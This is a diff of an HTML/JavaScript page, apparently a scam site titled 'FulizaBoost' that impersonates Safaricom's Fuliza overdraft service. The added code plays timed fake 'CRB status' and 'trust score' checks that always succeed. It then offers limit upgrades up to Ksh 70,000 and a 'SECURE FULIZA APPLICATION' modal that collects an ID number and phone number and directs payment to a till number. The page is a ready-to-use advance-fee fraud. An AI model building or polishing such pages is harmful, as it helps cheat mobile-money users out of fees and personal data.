@@ -3,191 +3,230 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Limit Upgrade</title>
+<title>FulizaBoost</title>
 
 <style>
 body {
   font-family: Arial, sans-serif;
-  background: #f5f6f7;
+  background: #f3f4f6;
   margin: 0;
   padding: 20px;
+  text-align: center;
 }
 
-.container {
+.card {
+  background: white;
+  padding: 20px;
+  border-radius: 20px;
   max-width: 400px;
   margin: auto;
-  background: #fff;
-  padding: 20px;
-  border-radius: 15px;
+  box-shadow: 0 5px 20px rgba(0,0,0,0.1);
 }
 
-h2 {
-  text-align: center;
-  margin-bottom: 20px;
+h2 { margin: 10px 0; }
+
+button {
+  padding: 15px;
+  border-radius: 12px;
+  border: none;
+  width: 100%;
+  font-size: 16px;
+  margin-top: 10px;
+}
+
+.green { background: #16a34a; color: white; }
+.dark { background: #0f172a; color: white; }
+
+.input {
+  width: 100%;
+  padding: 14px;
+  border-radius: 12px;
+  border: 1px solid #ddd;
+  margin-top: 10px;
+}
+
+.loader {
+  width: 50px;
+  height: 50px;
+  border: 5px solid #e5e7eb;
+  border-top: 5px solid #16a34a;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: auto;
+}
+
+@keyframes spin {
+  100% { transform: rotate(360deg); }
 }
 
 .grid {
   display: grid;
   grid-template-columns: 1fr 1fr;
-  gap: 12px;
+  gap: 10px;
 }
 
-.card {
+.box {
   padding: 15px;
-  text-align: center;
   border-radius: 12px;
-  background: #f1f1f1;
-  cursor: pointer;
-  transition: 0.3s;
+  background: #f9fafb;
   border: 2px solid transparent;
-}
-
-.card h3 {
-  color: green;
-  margin: 0;
-}
-
-.card p {
-  font-size: 12px;
-  color: gray;
-}
-
-.card.active {
-  background: #e6f4ea;
-  border: 2px solid green;
-}
-
-button {
-  width: 100%;
-  margin-top: 20px;
-  padding: 15px;
-  background: green;
-  color: white;
-  border: none;
-  border-radius: 12px;
-  font-size: 16px;
   cursor: pointer;
 }
 
-button:disabled {
-  background: #ccc;
+.box.active {
+  border: 2px solid #16a34a;
+  background: #e8f5e9;
+}
+
+.modal {
+  position: fixed;
+  top:0; left:0;
+  width:100%; height:100%;
+  background: rgba(0,0,0,0.4);
+  display:none;
+  align-items:center;
+  justify-content:center;
+}
+
+.modal-content {
+  background:white;
+  width:90%;
+  max-width:400px;
+  border-radius:20px;
+  overflow:hidden;
+}
+
+.modal-header {
+  background:#16a34a;
+  color:white;
+  padding:20px;
+}
+
+.modal-body { padding:20px; }
+
+.info {
+  background:#e8f5e9;
+  padding:10px;
+  border-radius:10px;
+  margin-bottom:10px;
 }
 </style>
-
 </head>
 
 <body>
 
-<div class="container">
-  <h2>Select Your New Approved Limit</h2>
+<div id="app"></div>
 
-  <div class="grid" id="cards">
-
-    <div class="card" data-amount="3000">
-      <h3>Ksh 3,000</h3>
-      <p>FEE: KSH 250</p>
+<!-- PAYMENT MODAL -->
+<div class="modal" id="modal">
+  <div class="modal-content">
+    <div class="modal-header">
+      <small>SECURE FULIZA APPLICATION</small>
+      <h3 id="modalTitle"></h3>
     </div>
+    <div class="modal-body">
+      <div class="info">
+        Enter your Safaricom number. Pay to Till Number <b>6363781</b> to proceed.
+      </div>
 
-    <div class="card" data-amount="5000">
-      <h3>Ksh 5,000</h3>
-      <p>FEE: KSH 293</p>
+      <input class="input" placeholder="ID Number">
+      <input class="input" id="phone" value="0704343709">
+
+      <button onclick="closeModal()">Cancel</button>
+      <button class="green" onclick="pay()">Pay</button>
     </div>
-
-    <div class="card" data-amount="7500">
-      <h3>Ksh 7,500</h3>
-      <p>FEE: KSH 350</p>
-    </div>
-
-    <div class="card" data-amount="10000">
-      <h3>Ksh 10,000</h3>
-      <p>FEE: KSH 500</p>
-    </div>
-
-    <div class="card" data-amount="12500">
-      <h3>Ksh 12,500</h3>
-      <p>FEE: KSH 747</p>
-    </div>
-
-    <div class="card" data-amount="16000">
-      <h3>Ksh 16,000</h3>
-      <p>FEE: KSH 898</p>
-    </div>
-
-    <div class="card" data-amount="21000">
-      <h3>Ksh 21,000</h3>
-      <p>FEE: KSH 1015</p>
-    </div>
-
-    <div class="card" data-amount="25500">
-      <h3>Ksh 25,500</h3>
-      <p>FEE: KSH 1220</p>
-    </div>
-
-    <div class="card" data-amount="30000">
-      <h3>Ksh 30,000</h3>
-      <p>FEE: KSH 1533</p>
-    </div>
-
-    <div class="card" data-amount="35000">
-      <h3>Ksh 35,000</h3>
-      <p>FEE: KSH 1730</p>
-    </div>
-
-    <div class="card" data-amount="45000">
-      <h3>Ksh 45,000</h3>
-      <p>FEE: KSH 2000</p>
-    </div>
-
-    <div class="card" data-amount="60000">
-      <h3>Ksh 60,000</h3>
-      <p>FEE: KSH 2250</p>
-    </div>
-
-    <div class="card" data-amount="70000">
-      <h3>Ksh 70,000</h3>
-      <p>FEE: KSH 2500</p>
-    </div>
-
   </div>
-
-  <button id="upgradeBtn" disabled>
-    ⚡ SELECT LIMIT FIRST
-  </button>
-
 </div>
 
 <script>
-const cards = document.querySelectorAll(".card");
-const button = document.getElementById("upgradeBtn");
+let step = 1;
+let selectedAmount = 3000;
 
-let selectedAmount = null;
+function render() {
+  const app = document.getElementById("app");
 
-cards.forEach(card => {
-  card.addEventListener("click", () => {
-
-    // remove active from all
-    cards.forEach(c => c.classList.remove("active"));
-
-    // add active to clicked
-    card.classList.add("active");
-
-    // get amount
-    selectedAmount = card.getAttribute("data-amount");
-
-    // enable button
-    button.disabled = false;
-
-    // update button text
-    button.innerText = "⚡ UPGRADE TO KSH " + Number(selectedAmount).toLocaleString();
-  });
-});
-
-// button click action
-button.addEventListener("click", () => {
-  if(selectedAmount){
-    alert("Proceeding with Ksh " + selectedAmount);
+  // STEP 1
+  if(step === 1){
+    app.innerHTML = `
+    <div class="card">
+      <h2>Fuliza Plus+</h2>
+      <p>Verify your identity to unlock higher limits</p>
+      <input class="input" placeholder="Enter M-Pesa Number">
+      <button class="green" onclick="next()">Check My Eligibility</button>
+    </div>`;
   }
-});
+
+  // STEP 2-5 LOADING
+  if(step >=2 && step <=5){
+    const texts = [
+      "Connecting...",
+      "Verifying CRB Status...",
+      "Finalizing Trust Score...",
+      "Checking Usage History..."
+    ];
+    app.innerHTML = `
+    <div class="card">
+      <div class="loader"></div>
+      <h3>${texts[step-2]}</h3>
+      <p>Accessing secure databases...</p>
+    </div>`;
+    setTimeout(()=>{ step++; render(); }, 1500);
+  }
+
+  // STEP 6 SUCCESS
+  if(step === 6){
+    app.innerHTML = `
+    <div class="card">
+      <h2>✅ Congratulations!</h2>
+      <p>High Trust Score Detected.</p>
+      <button class="dark" onclick="next()">Proceed to Upgrade Limit</button>
+    </div>`;
+  }
+
+  // STEP 7 LIMITS
+  if(step === 7){
+    const amounts = [3000,5000,7500,10000,12500,16000,21000,25500,30000,35000,45000,60000,70000];
+
+    app.innerHTML = `
+    <div class="card">
+      <h2>Select Your Limit</h2>
+      <div class="grid">
+        ${amounts.map(a=>`
+          <div class="box ${a===selectedAmount?'active':''}" onclick="select(${a})">
+            Ksh ${a}
+          </div>
+        `).join("")}
+      </div>
+      <button class="green" onclick="openModal()">UPGRADE TO Ksh ${selectedAmount}</button>
+    </div>`;
+  }
+}
+
+function next(){
+  step++;
+  render();
+}
+
+function select(a){
+  selectedAmount = a;
+  render();
+}
+
+function openModal(){
+  document.getElementById("modal").style.display = "flex";
+  document.getElementById("modalTitle").innerText =
+    "Limit will be boosted to Ksh " + selectedAmount;
+}
+
+function closeModal(){
+  document.getElementById("modal").style.display = "none";
+}
+
+function pay(){
+  alert("Processing payment...");
+}
+
+render();
 </script>
 
 </body>
